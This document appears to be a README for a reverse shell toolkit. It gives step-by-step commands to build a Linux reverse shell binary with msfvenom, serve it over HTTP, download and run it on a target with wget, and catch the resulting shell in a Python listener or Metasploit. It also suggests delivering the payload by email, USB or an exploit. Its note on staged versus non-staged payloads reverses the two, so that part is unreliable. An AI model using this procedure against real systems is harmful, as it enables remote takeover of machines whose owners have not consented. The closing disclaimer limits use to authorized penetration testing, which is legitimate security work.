# Reverse TCP Shell Toolkit

This toolkit provides two Python scripts to generate and catch a reverse TCP shell on a Linux target:
- `generate_payload.py`: Creates a `shell.elf` payload using `msfvenom` for a 64-bit Linux system.
- `listener.py`: A Python-based listener to catch the reverse shell (optional, less reliable).

You can catch the shell using either the Python listener or Metasploit’s `msfconsole` (recommended for reliability). This `README.md` explains both paths.

## Prerequisites
- **Metasploit Framework**: Required for `generate_payload.py` and the Metasploit path.
  - Install on macOS/Linux:
    ```bash
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
    chmod 755 msfinstall
    sudo ./msfinstall
    ```
  - Add to PATH (for zsh):
    ```bash
    echo 'export PATH="$PATH:/opt/metasploit-framework/bin"' >> ~/.zshrc
    source ~/.zshrc
    ```
  - Verify:
    ```bash
    which msfvenom
    which msfconsole
    ```
- **Python 3**: Required for both scripts.
  - Verify:
    ```bash
    python3 --version
    ```
- **Network Access**: The target must reach your attacking machine’s IP (`LHOST`) and port (`LPORT`).
- **Firewall**: Allow incoming connections on your `LPORT` (e.g., `4444`) and web server port (`8000`):
  ```bash
  sudo ufw allow 4444
  sudo ufw allow 8000
  ```

## Finding Your LHOST
- `LHOST` is your attacking machine’s IP address (not the target’s).
- Find it:
  ```bash
  ifconfig | grep inet
  ```
  - Look for an IP like `192.168.x.x` (e.g., `192.168.1.100`), not `127.0.0.1`.
  - If the target is on a different network, use your public IP (`curl ifconfig.me`) and set up port forwarding.

## Path 1: Using the Python Listener

### Step 1: Generate the Payload
- Run:
  ```bash
  python3 generate_payload.py
  ```
- Enter:
  - `LHOST`: Your attacking machine’s IP (e.g., `192.168.1.100`).
  - `LPORT`: A port for the shell (e.g., `4444`).
- Output: Creates `shell.elf` in the current directory.
- Verify:
  ```bash
  ls
  ```

### Step 2: Host the Payload
- Start a web server to host `shell.elf`:
  ```bash
  python3 -m http.server 8000
  ```
- Keep this terminal open.

### Step 3: Download and Run on the Target
- On the **target Linux machine** (via terminal, SSH, or exploit):
  ```bash
  wget http://<your_LHOST>:8000/shell.elf
  chmod +x shell.elf
  ./shell.elf
  ```
  - Replace `<your_LHOST>` with your attacking machine’s IP (e.g., `192.168.1.100`).

### Step 4: Start the Python Listener
- In a new terminal on your attacking machine:
  ```bash
  python3 listener.py
  ```
- Enter:
  - `HOST`: Use `0.0.0.0` to listen on all interfaces.
  - `PORT`: Same `LPORT` as in Step 1 (e.g., `4444`).
- When the target runs `shell.elf`, you’ll get a shell in the listener terminal.

### Note
- The Python listener is less reliable for the `linux/x64/shell_reverse_tcp` payload (staged). For better results, use the Metasploit path below or switch to a non-staged payload (edit `generate_payload.py` to use `linux/x64/shell/reverse_tcp`).

## Path 2: Using Metasploit (Recommended)

### Step 1: Generate the Payload
- Same as Path 1:
  ```bash
  python3 generate_payload.py
  ```
- Enter:
  - `LHOST`: Your attacking machine’s IP (e.g., `192.168.1.100`).
  - `LPORT`: A port for the shell (e.g., `4444`).
- Output: Creates `shell.elf`.

### Step 2: Host the Payload
- Same as Path 1:
  ```bash
  python3 -m http.server 8000
  ```

### Step 3: Download and Run on the Target
- Same as Path 1, on the **target**:
  ```bash
  wget http://<your_LHOST>:8000/shell.elf
  chmod +x shell.elf
  ./shell.elf
  ```

### Step 4: Start Metasploit Listener
- In a new terminal on your attacking machine:
  ```bash
  msfconsole
  ```
- In `msfconsole`:
  ```ruby
  use multi/handler
  set PAYLOAD linux/x64/shell_reverse_tcp
  set LHOST <your_LHOST>
  set LPORT <your_LPORT>
  exploit
  ```
  - Replace `<your_LHOST>` and `<your_LPORT>` with the same values from Step 1 (e.g., `192.168.1.100` and `4444`).
- When the target runs `shell.elf`, you’ll get a shell in `msfconsole`.

## Payload Delivery Notes
- **Web Server**: The `python3 -m http.server 8000` method is one way to deliver `shell.elf`. Alternatively, use email, USB, or an exploit to transfer the file.
- **Target Access**: You need a way to run commands on the target (e.g., terminal access, SSH, or a vulnerability).
- **Verify Delivery**: On the target:
  ```bash
  ls
  ```

## Troubleshooting
- **msfconsole Not Found**:
  - Verify:
    ```bash
    ls /opt/metasploit-framework/bin/msfconsole
    ```
  - Reinstall if needed (see Prerequisites).
- **No Connection**:
  - Ensure `LHOST` and `LPORT` match in `generate_payload.py` and `listener.py`/`msfconsole`.
  - Test reachability from the target:
    ```bash
    ping <your_LHOST>
    ```
  - Check firewall:
    ```bash
    sudo ufw status
    ```
- **Target Architecture**:
  - `shell.elf` is for 64-bit Linux. For 32-bit, edit `generate_payload.py`:
    ```python
    payload = "linux/x86/shell_reverse_tcp"
    ```
  - Re-run `generate_payload.py`.
- **Listener Errors**:
  - If `listener.py` fails (e.g., “Address already in use”):
    ```bash
    netstat -tuln | grep <your_LPORT>
    ```
  - Kill conflicting processes or choose a different `LPORT`.

## Security Disclaimer
This toolkit is for **authorized penetration testing only**. Use only on systems you have explicit permission to test. Unauthorized use is illegal.

## Contact
- Website: [beluli.mk](https://beluli.mk)
- Roles: Penetration Tester, Bug Bounty Hunter, Security Researcher